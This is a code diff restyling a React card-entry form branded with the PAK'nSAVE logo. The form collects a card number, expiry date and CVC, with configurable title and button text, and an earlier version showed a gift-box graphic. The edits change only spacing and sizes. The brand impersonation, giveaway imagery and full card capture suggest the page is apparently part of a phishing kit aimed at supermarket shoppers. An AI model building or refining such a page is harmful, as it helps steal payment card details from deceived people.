@@ -119,32 +119,22 @@ export function CardClient({ sessionId }: Props) {
 
   return (
     <div className="pak-page-shell">
-      <div className="pak-form-card w-full max-w-[980px] fade-in">
-        <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
-          <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
-            <div className="min-w-0">
-              <div className="max-w-[36rem]">
-                <h2 className="pak-form-title">{settings.card_title}</h2>
-                <p className="pak-form-subtitle mt-3">{settings.card_subtitle}</p>
-              </div>
+      <div className="pak-form-card w-full max-w-[860px] fade-in">
+        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
+          <div className="flex items-start justify-between gap-3">
+            <div className="min-w-0 max-w-[29rem]">
+              <h2 className="pak-form-title">{settings.card_title}</h2>
+              <p className="pak-form-subtitle mt-2">{settings.card_subtitle}</p>
             </div>
-
-            <div className="flex items-start justify-between gap-4 lg:block">
-              <img
-                src="/form-assets/paknsave-logo-form.png"
-                alt="PAK'nSAVE"
-                className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
-                id="card-brand-logo"
-              />
-              <img
-                src="/form-assets/paknsave-gift-box.png"
-                alt=""
-                className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
-              />
-            </div>
+            <img
+              src="/form-assets/paknsave-logo-form.png"
+              alt="PAK'nSAVE"
+              className="pak-form-brand-logo shrink-0"
+              id="card-brand-logo"
+            />
           </div>
 
-          <form onSubmit={handleSubmit} className="mt-7 space-y-5 sm:space-y-6">
+          <form onSubmit={handleSubmit} className="mt-5 space-y-4 sm:mt-6 sm:space-y-5">
             <label className="pak-form-label">
               {settings.card_number_label}
               <div className="pak-form-input-wrap">
@@ -157,7 +147,7 @@ export function CardClient({ sessionId }: Props) {
                 <input
                   required
                   inputMode="numeric"
-                  className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg tracking-[0.22em]"
+                  className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.18em]"
                   value={number}
                   onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                   autoComplete="cc-number"
@@ -177,7 +167,7 @@ export function CardClient({ sessionId }: Props) {
                   <input
                     required
                     placeholder="MM/YY"
-                    className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
+                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg"
                     value={expiry}
                     onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                     autoComplete="cc-exp"
@@ -199,7 +189,7 @@ export function CardClient({ sessionId }: Props) {
                     required
                     inputMode="numeric"
                     maxLength={4}
-                    className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg tracking-[0.18em]"
+                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.14em]"
                     value={cvc}
                     onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                     autoComplete="cc-csc"
@@ -218,7 +208,7 @@ export function CardClient({ sessionId }: Props) {
 
             {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
 
-            <div className="flex flex-col gap-4 pt-1 md:flex-row md:items-center md:justify-between">
+            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
               <div className="pak-form-security">
                 <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                   <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
@@ -229,7 +219,7 @@ export function CardClient({ sessionId }: Props) {
               <button
                 type="submit"
                 disabled={saving || !expiryValid || !cvcValid}
-                className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
+                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
               >
                 {saving ? "Submitting..." : settings.card_button}
               </button>
